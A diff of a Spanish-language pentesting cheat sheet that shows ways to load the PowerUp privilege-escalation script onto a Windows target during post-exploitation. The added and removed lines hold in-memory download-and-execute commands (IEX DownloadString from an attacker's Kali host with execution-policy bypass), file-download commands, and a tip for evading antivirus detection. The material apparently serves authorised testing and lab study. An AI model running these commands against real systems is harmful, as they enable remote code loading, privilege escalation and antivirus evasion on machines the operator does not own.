@@ -21,19 +21,20 @@ Tags: #Windows #Powershell #PowerUp #PrivEsc #Enumeracion #Servicios #PostExplot
 ## 1. TRANSFERIR Y CARGAR EL SCRIPT
 
 ```powershell
-# Opción 1 → Cargar en memoria desde servidor HTTP (sin tocar disco → más sigiloso)
-# En Kali → python3 -m http.server 80
-❯ IEX (New-Object Net.WebClient).DownloadString('http://<IP_KALI>/PowerUp.ps1') | iex; Invoke-AllChecks
+# Cargar en memoria  <- MEJOR OPCIÓN 
+❯ powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://<IP_KALI>/PowerUp.ps1');Invoke-AllChecks > power.log 
 
-# Opción 2 → Subir y ejecutar desde disco
-❯ upload /ruta/kali/PowerUp.ps1          # Desde evil-winrm
+
+# Cargar en disco 
+❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/PowerUp.ps1','PowerUp.ps1')"
 ❯ Import-Module .\PowerUp.ps1
 ❯ Invoke-AllChecks
 
-# Opción 3 → Versión ofuscada si AV detecta la normal
+# Opfuscada en disco
+# Para ofuscar → abrir PowerUp.ps1 → línea 2640 → eliminar contenido de $B64Binary 
+❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/PowerUp_obf.ps1','PowerUp_obf.ps1')"
 ❯ Import-Module .\PowerUp_obf.ps1
 ❯ Invoke-AllChecks
-# Para ofuscar → abrir PowerUp.ps1 → línea 2640 → eliminar contenido de $B64Binary
 ```
 
 ---
